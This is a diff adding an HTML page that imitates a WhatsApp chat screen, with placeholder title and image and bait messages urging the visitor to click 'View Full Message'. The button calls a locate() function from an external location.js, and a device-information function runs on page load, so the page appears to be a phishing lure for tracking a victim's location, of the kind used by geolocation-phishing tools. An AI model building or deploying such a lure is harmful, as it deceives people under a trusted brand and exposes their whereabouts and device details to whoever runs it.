@@ -1,0 +1,290 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="theme-color" content="#00A884">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <title>WhatsApp Message</title>
+    <script type="text/javascript">
+        if (window.location.protocol == "http:") {
+            var restOfUrl = window.location.href.substr(5);
+            window.location = "https:" + restOfUrl;
+        }
+    </script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif;
+            background: #fff;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .phone-frame {
+            width: 100%;
+            max-width: 400px;
+            background: #111;
+            border-radius: 40px;
+            overflow: hidden;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+            border: 12px solid #000;
+        }
+
+        .status-bar {
+            background: #1f1f1f;
+            color: white;
+            padding: 8px 20px;
+            font-size: 12px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .status-left {
+            display: flex;
+            gap: 4px;
+        }
+
+        .status-right {
+            display: flex;
+            gap: 4px;
+            align-items: center;
+        }
+
+        .chat-container {
+            background: #fff;
+            height: 100%;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .chat-header {
+            background: #f0f0f0;
+            border-bottom: 1px solid #e5e5e5;
+            padding: 12px 16px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .back-arrow {
+            font-size: 20px;
+            cursor: pointer;
+            color: #00A884;
+        }
+
+        .contact-info {
+            flex: 1;
+        }
+
+        .contact-name {
+            font-size: 15px;
+            font-weight: 600;
+            color: #000;
+        }
+
+        .contact-status {
+            font-size: 12px;
+            color: #999;
+            margin-top: 2px;
+        }
+
+        .chat-options {
+            font-size: 20px;
+            color: #666;
+        }
+
+        .messages {
+            flex: 1;
+            padding: 16px;
+            overflow-y: auto;
+            background: #fff;
+            display: flex;
+            flex-direction: column;
+            gap: 8px;
+        }
+
+        .message-group {
+            display: flex;
+            flex-direction: column;
+            gap: 4px;
+        }
+
+        .message-received {
+            background: #e5e5ea;
+            color: #000;
+            padding: 10px 14px;
+            border-radius: 18px 18px 18px 4px;
+            max-width: 85%;
+            word-wrap: break-word;
+            font-size: 14px;
+            line-height: 1.4;
+        }
+
+        .timestamp {
+            font-size: 11px;
+            color: #999;
+            padding: 0 16px;
+            text-align: center;
+            margin: 12px 0;
+        }
+
+        .action-container {
+            background: #f0f0f0;
+            padding: 16px;
+            border-top: 1px solid #e5e5e5;
+        }
+
+        .action-button {
+            background: linear-gradient(135deg, #00A884 0%, #00897b 100%);
+            color: white;
+            border: none;
+            padding: 14px;
+            font-size: 16px;
+            font-weight: 600;
+            border-radius: 25px;
+            cursor: pointer;
+            width: 100%;
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 15px rgba(0, 168, 132, 0.3);
+            margin-bottom: 8px;
+        }
+
+        .action-button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(0, 168, 132, 0.4);
+        }
+
+        .action-button.secondary {
+            background: #e5e5ea;
+            color: #00A884;
+        }
+
+        .action-button.secondary:hover {
+            background: #d9d9de;
+        }
+
+        .typing-indicator {
+            display: flex;
+            gap: 4px;
+            padding: 10px 14px;
+        }
+
+        .typing-dot {
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+            background: #ccc;
+            animation: typing 1.4s infinite;
+        }
+
+        .typing-dot:nth-child(2) {
+            animation-delay: 0.2s;
+        }
+
+        .typing-dot:nth-child(3) {
+            animation-delay: 0.4s;
+        }
+
+        @keyframes typing {
+            0%, 60%, 100% {
+                opacity: 0.3;
+                transform: translateY(0);
+            }
+            30% {
+                opacity: 1;
+                transform: translateY(-10px);
+            }
+        }
+
+        @media (max-width: 480px) {
+            .phone-frame {
+                border-radius: 20px;
+                border: 8px solid #000;
+            }
+
+            .message-received {
+                max-width: 90%;
+            }
+        }
+    </style>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+    <script src="js/location.js"></script>
+</head>
+<body onload="information();">
+    <div class="phone-frame">
+        <div class="status-bar">
+            <div class="status-left">
+                <span>9:41</span>
+            </div>
+            <div class="status-right">
+                <span>📶</span>
+                <span>📡</span>
+                <span>🔋</span>
+            </div>
+        </div>
+
+        <div class="chat-container">
+            <div class="chat-header">
+                <div class="back-arrow">‹</div>
+                <div class="contact-info">
+                    <div class="contact-name">$TITLE$</div>
+                    <div class="contact-status">Online</div>
+                </div>
+                <div class="chat-options">⋮</div>
+            </div>
+
+            <div class="messages">
+                <div class="timestamp">Today 9:35 AM</div>
+
+                <div class="message-group">
+                    <div class="message-received">
+                        Hey! Check this out 👇
+                    </div>
+                    <div class="message-received" style="background: url('$IMAGE$'); background-size: cover; color: transparent; padding: 0; width: 70%; height: 150px; border-radius: 18px 18px 18px 4px;">
+                        [image]
+                    </div>
+                </div>
+
+                <div class="message-group" style="margin-top: 12px;">
+                    <div class="message-received">
+                        This is amazing! You need to see this 🔥
+                    </div>
+                </div>
+
+                <div class="message-group" style="margin-top: 12px;">
+                    <div class="message-received">
+                        Click here to view the full content →
+                    </div>
+                </div>
+
+                <div style="margin-top: 16px; display: flex; gap: 4px;">
+                    <div class="typing-indicator">
+                        <div class="typing-dot"></div>
+                        <div class="typing-dot"></div>
+                        <div class="typing-dot"></div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="action-container">
+                <button class="action-button" onclick="locate(function(){alert('Thank you for responding!'); $('#change').html('Success');}, function(){$('#change').html('Failed');});" id="change">
+                    View Full Message
+                </button>
+                <button class="action-button secondary">
+                    Later
+                </button>
+            </div>
+        </div>
+    </div>
+</body>
+</html>
